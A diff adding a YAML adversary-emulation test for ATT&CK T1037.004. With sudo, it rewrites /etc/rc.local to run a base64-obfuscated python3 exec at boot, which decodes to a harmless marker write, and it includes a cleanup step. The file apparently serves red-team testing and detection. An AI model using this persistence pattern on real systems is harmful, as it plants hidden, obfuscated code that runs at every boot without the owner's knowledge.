@@ -1,0 +1,24 @@
+---
+- id: 6fa0ca70930afa66c98d1ef07e9b18a4
+  name: rc.local
+  description: 'Modify rc.local
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1037.004
+    name: 'Boot or Logon Initialization Scripts: Rc.common'
+  platforms:
+    linux:
+      sh:
+        command: filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else
+          sudo cp $filename /etc/rc.local.original;fi; [ "$(uname)" = 'FreeBSD' ]
+          && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee
+          /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local; echo "\npython3
+          -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\""
+          | sudo tee -a /etc/rc.local; printf 'exit 0' | sudo tee -a /etc/rc.local;
+          sudo chmod +x /etc/rc.local
+        payloads: []
+        cleanup: origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then
+          sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm
+          $origfilename;fi
